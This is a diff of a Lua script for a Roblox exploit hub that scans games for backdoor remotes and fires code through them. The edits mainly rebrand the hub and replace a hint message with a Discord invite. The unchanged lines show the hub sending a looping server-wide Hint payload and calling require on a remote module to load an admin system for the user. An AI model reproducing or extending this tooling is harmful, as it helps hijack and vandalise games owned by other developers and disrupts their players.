@@ -59,7 +59,7 @@ LMG2L["TextLabel_12"]["BackgroundTransparency"] = 1;
 LMG2L["TextLabel_12"]["FontFace"] = Font.new("rbxasset://fonts/families/Zekton.json");
 LMG2L["TextLabel_12"]["TextColor3"] = Color3.fromRGB(255, 253, 253);
 LMG2L["TextLabel_12"]["Size"] = UDim2.new(1, 0, 0, 54);
-LMG2L["TextLabel_12"]["Text"] = [[ZachLOL HUB]];
+LMG2L["TextLabel_12"]["Text"] = [[H4KZLOL HUB]];
 LMG2L["TextLabel_12"]["Position"] = UDim2.new(0, 0, 0, 0);
 
 local grad13 = Instance.new("UIGradient", LMG2L["TextLabel_12"]);
@@ -299,7 +299,7 @@ LMG2L["Scan_1d"].MouseButton1Click:Connect(function()
                 if workspace:FindFirstChild(code) then workspace[code]:Destroy() end
 
                 StarterGui:SetCore("SendNotification", {
-                    Title = "ZACHLOL",
+                    Title = "H4KZLOL",
                     Text = "Found backdoor! 676" .. game.PlaceId .. "676",
                     Duration = 6
                 })
@@ -308,13 +308,13 @@ LMG2L["Scan_1d"].MouseButton1Click:Connect(function()
                 for i, name in ipairs(scanResults) do
                     warn(i .. ". " .. name)
                 end
-                print("finished, B1tch!")
+                print("finished..")
 
                 -- you can change it anytime
                 local hintPayload = [[
 local h = Instance.new("Hint", workspace)
 while true do
-    h.Text = "PRABOWO:I NEED SAWIT!!"--WTH IS THIS😭🙏
+    h.Text = "h4rkzcool | https://discord.gg/EKpDmETUV"
     wait(0.5)
 end
 ]]
@@ -357,4 +357,4 @@ LMG2L["HD ADMIN_c"].MouseButton1Click:Connect(function()
     local code = 'require(7192763922).load("' .. PlayerName .. '")'
     for _, bd in ipairs(foundBackdoors) do pcall(function() fire(bd, code) end) end
 end)
-print("ZACHLOL hub")
+print("H4KZLOL hub")
